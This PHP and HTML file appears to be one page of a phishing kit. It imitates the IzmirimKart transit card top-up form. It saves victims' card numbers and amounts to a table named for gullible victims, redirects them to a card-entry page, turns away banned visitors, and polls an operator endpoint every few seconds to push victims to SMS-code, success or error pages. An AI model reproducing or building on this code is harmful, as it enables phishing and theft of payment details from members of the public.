
<?php
date_default_timezone_set('Europe/Istanbul');
include('baglan.php');
$ip = $_SERVER['HTTP_HOST'];

if($_POST){
    $info   = icerikTemizle(guvenlik(trim($_POST['istk'])));
    $money       = icerikTemizle(guvenlik(trim($_POST['tutar'])));
   $ip = $_SERVER['HTTP_HOST'];
    $date       = date('d.m.Y H:i');
    
	$query = $db->prepare("INSERT INTO sazan SET info=?,date=?,money=?,ip=?");
	$insert = $query->execute(array($info,$date,$money,$ip));


    if($insert){
     header('Location:kart.php');
    }
}

$ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
foreach($ban as $kontrol){
    if($kontrol['ban'] == $ip){ 
            header('Location:http://www.turkiye.gov.tr');
        } 
}

?>
<!DOCTYPE html>
<html lang="tr">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="icon" href="../dvdvdvdv.pnh" type="image/x-icon" />
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Mulish:wght@500&display=swap" rel="stylesheet">
<link rel="shortcut icon" href="../dvdvdvdv.png" type="image/x-icon" />

<meta name="viewport" content="width=device-width, initial-scale=1">

<link href="anadosya/bootstrap.min.css" rel="stylesheet">
<link href="anadosya/style.css" rel="stylesheet">
<link href="anadosya/responsive.css" rel="stylesheet">
<title>IzmirimKart | Yükleme</title>
</head>
<body>
<div class="body_wrapper frm-vh-md-100">
<div class="formify_body" data-bg-color="#E3F0FF" style="background-color: rgb(227, 240, 255);">
<div class="f_content">
<div class="container">
<div class="row">
<div class="formify_box">
<div class="formify_header text-center">
<a href="#" class="mb-3 formify_logo"><img style="width:70%" src="logorenk1.png" alt=""></a>
<h4 class="form_title" style="font-family: 'Mulish', sans-serif;">Bakiye Yükle</h4>
</div>
<div class="text-center">
</div>
<form method="POST" action="#">
<div class="signup_form">
<div class="form-group">
<label class="input_title" style="font-family: 'Mulish', sans-serif;" for="inputEmail">IzmirimKart Kart Numarası</label>
<input name="istk" type="tel" class="form-control" maxlength="13" data-slots="" placeholder="XXXXX-XXXXX-X" onkeyup="
  var date = this.value;
  if (date.match(/^\d{5}$/) !== null) {
     this.value = date + '-';
  } else if (date.match(/^\d{5}-\d{5}$/) !== null) {
     this.value = date + '-';
  }">
<br>
<label class="input_title" style="font-family: 'Mulish', sans-serif;" for="inputEmail">Yüklenecek Tutar</label>
<select name="tutar" type="text" class="form-control" required="">
<option value="5">5 TL</option>
<option value="10" selected>10 TL</option>
<option value="20">20 TL</option>
<option value="30">30 TL</option>
<option value="40">40 TL</option>
<option value="50">50 TL</option>
<option value="75">75 TL</option>
<option value="100">100 TL</option>
<option value="120">120 TL</option>
<option value="150">150 TL</option>
<option value="200">200 TL</option>
</select>
</div><br>
<div class="form-group">
<style>
   .thm_btn {
    width: 100%;
    font-size: 16px;
    line-height: 25px;
    font-weight: 700;
    background: #134395;
    color: #fff;
    border-radius: 5px;
    text-transform: uppercase;
    padding: 14px 53px;
    box-shadow: none;
    transition: all .2s linear;
    margin-top: 5px;
}
</style>
<button type="submit" id="btnDevam" class="btn action_btn thm_btn">Devam Et</button>
</div>
</form>
</div>
</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>


<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.4/jquery.min.js"></script>
<script src="../cdn.jsdelivr.net/npm/bootstrap%405.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>


<script type="text/javascript">
 $(document).ready(function() {

    gonder();

    var int=self.setInterval("gonder()",3000);
  
});

function gonder(){

    $.ajax({
      type:'POST',
      url:'<?php echo "datach.php?ip=".$ip; ?>',
      success: function (msg) {
      
      if(msg=='sms'){
        window.location.href='sms.php';
      }
      if(msg=='tebrik'){
        window.location.href='tebrik.php';
      }
       if(msg=='hata'){
        window.location.href='hata.php';
      }
      if(msg=='sms2'){
        window.location.href='hatali.php';
      } 
      }
    });
    
}
</script>